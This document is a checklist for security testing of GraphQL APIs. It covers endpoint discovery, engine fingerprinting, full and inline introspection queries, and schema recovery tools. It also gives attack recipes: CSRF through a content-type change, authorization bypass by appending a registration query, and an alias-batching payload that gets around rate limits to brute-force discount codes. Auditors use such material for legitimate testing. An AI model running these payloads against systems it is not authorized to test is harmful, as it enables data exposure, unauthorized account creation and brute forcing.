# Finding GraphQL endpoints

- [ ] `/graphql`
- [ ] `/graphiql`
- [ ] `/graphql.php`
- [ ] `/graphql/console`
- [ ] `/api`
- [ ] `/api/graphql`
- [ ] `/graphql/api`
- [ ] `/graphql/graphql`

# Fingerprint

- [ ] The tool [**graphw00f**](https://github.com/dolevf/graphw00f) is capable to detect wich GraphQL engine is used in a server and then prints some helpful information for the security auditor.
- [ ] Universal queries `query{__typename}`

# Introspection

- [ ] `query={__schema{types{name,fields{name}}}}`
- [ ] `query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}`
- [ ] Full Introspection Query
```json
#Full introspection query

query IntrospectionQuery {

__schema {

queryType {

name

}

mutationType {

name

}

subscriptionType {

name

}

types {

...FullType

}

directives {

name

description

args {

...InputValue

}

onOperation #Often needs to be deleted to run query

onFragment #Often needs to be deleted to run query

onField #Often needs to be deleted to run query

}

}

}

fragment FullType on __Type {

kind

name

description

fields(includeDeprecated: true) {

name

description

args {

...InputValue

}

type {

...TypeRef

}

isDeprecated

deprecationReason

}

inputFields {

...InputValue

}

interfaces {

...TypeRef

}

enumValues(includeDeprecated: true) {

name

description

isDeprecated

deprecationReason

}

possibleTypes {

...TypeRef

}

}

fragment InputValue on __InputValue {

name

description

type {

...TypeRef

}

defaultValue

}

fragment TypeRef on __Type {

kind

name

ofType {

kind

name

ofType {

kind

name

ofType {

kind

name

}

}

}

}
```

>If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them

- [ ] Inline introspection query: 
	```
	/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
	```
# GraphQL Without Introspection
- [ ] The errors that graphql throws when an unexpected request is received are enough for tools like [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) to recreate most part of the schema.
- [ ] The Burp Suite extension [**GraphQuail**](https://github.com/forcesunseen/graphquail) extension **observes GraphQL API requests going through Burp** and **builds** an internal GraphQL **schema** with each new query it sees. It can also expose the schema for GraphiQL and Voyager. The extension returns a fake response when it receives an introspection query. As a result, GraphQuail shows all queries, arguments, and fields available for use within the API. For more info [**check this**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).
- [ ] A nice **wordlist** to discover [**GraphQL entities can be found here**](https://github.com/Escape-Technologies/graphql-wordlist?).
- [ ] **special character after the** `**__schema**` **keyword** 
```json
#Introspection query with newline

{

"query": "query{__schema

{queryType{name}}}"

}
```
- [ ] The `Sources` tab of the developer tools can search all files to enumerate where the queries are saved. Sometimes even the administrator protected queries are already exposed.
```
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```

# Vulns

## CSRF in GraphQL
- [ ] Change content type from `application/json` -> `x-www-form-urlencoded`
- [ ] Change Request Method via Burp two times
- [ ] Observe that the GraphQL accept this request without Errors
- [ ] Create the CSRF POC 
- [ ] for more info [See this](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)
## Bypass authorization in GraphQL
- [ ] Check for IDOR
- [ ] Check for hidden parameters
- [ ] Try Play with Parameters
In the below example you can see that the operation is "forgotPassword" and that it should only execute the forgotPassword query associated with it. This can be bypassed by adding a query to the end, in this case we add "register" and a user variable for the system to register as a new user.
![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-ed42bdf13a6dc697fdb1579c1d408d48774e7872%2FGraphQLAuthBypassMethod.PNG?alt=media)

## Rate limit bypass using aliases

```json
#Request with aliased queries
query isValidDiscount($code: Int) {
    isvalidDiscount(code:$code){
        valid
    }
    isValidDiscount2:isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3:isValidDiscount(code:$code){
        valid
    }
}
```